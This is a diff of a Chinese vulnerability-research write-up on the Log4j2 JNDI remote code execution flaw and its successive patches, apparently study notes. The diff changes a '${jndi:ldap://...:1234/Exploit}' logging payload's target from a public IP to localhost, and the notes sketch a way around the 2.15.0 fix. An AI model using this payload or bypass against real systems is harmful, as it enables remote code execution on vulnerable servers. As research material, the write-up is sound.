@@ -26,7 +26,7 @@ public class log4j {
     private static final Logger logger = LogManager.getLogger(log4j.class);
 
     public static void main(String[] args) {
-        logger.error("${jndi:ldap://49.232.128.44:1234/Exploit}");
+        logger.error("${jndi:ldap://127.0.0.1:1234/Exploit}");
     }
 }
 ```
@@ -199,9 +199,26 @@ JavaLookup#lookup局限这几个
 
 ![image-20211212222047702](./images/image-20211212222047702.png)
 
-但是strLookupMap中没有bundle这个key，应该不能直接触发，除非开发人员直接使用并且参数可控
+不过需要在spring中手动取出原生的日志记录...
 
-`ResourceBundle.getBundle(bundleName).getString(bundleKey)`
+```xml
+<dependency>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-web</artifactId>
+    <exclusions>
+        <exclusion>
+            <groupId>org.springframework.boot</groupId>
+            <artifactId>spring-boot-starter-logging</artifactId>
+        </exclusion>
+    </exclusions>
+</dependency>
+<dependency>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-log4j2</artifactId>
+</dependency>
+```
+
+![image-20211230155344732](log4j_RCE.assets/image-20211230155344732.png)
 
 ## 2.15.0 更新
 
@@ -209,11 +226,11 @@ JavaLookup#lookup局限这几个
 
 2.16.0的补丁是直接删了LookupMessagePatternConverter，所以即使配置lookups也已经不存在调用jndilookup了
 
-![image-20211221160025073](log4j_RCE.assets/image-20211221160025073.png)
+![image-20211221173221968](images/image-20211221173221968.png)
 
 而2.17.0补丁在lookup这里改了if里的部分代码，只允许java协议的lookup
 
-![image-20211221144822077](log4j_RCE.assets/image-20211221144822077.png)
+![image-20211221144822077](images/image-20211221144822077.png)
 
 问题出在2.15.0的`uri.getHost()`，利用方式文章里写的很清楚，比如
 
@@ -232,7 +249,7 @@ System.out.println(uri3.getHost());
 1. javaSerializedData不为空且javaClassName在白名单中
 2. javaReferenceAddress和javaFactory都为空
 
-![image-20211221163439414](log4j_RCE.assets/image-20211221163439414.png)
+![image-20211221163439414](images/image-20211221163439414.png)
 
 第二个限制不允许远程加载对象和远程工厂，那就用第一个，结合ldap绕高版本jndi的方式(需要本地gadget)
 
@@ -272,12 +289,6 @@ log4j2.xml
     </loggers>
 </configuration>
 ```
-
-
-
-
-
-
 
 
 
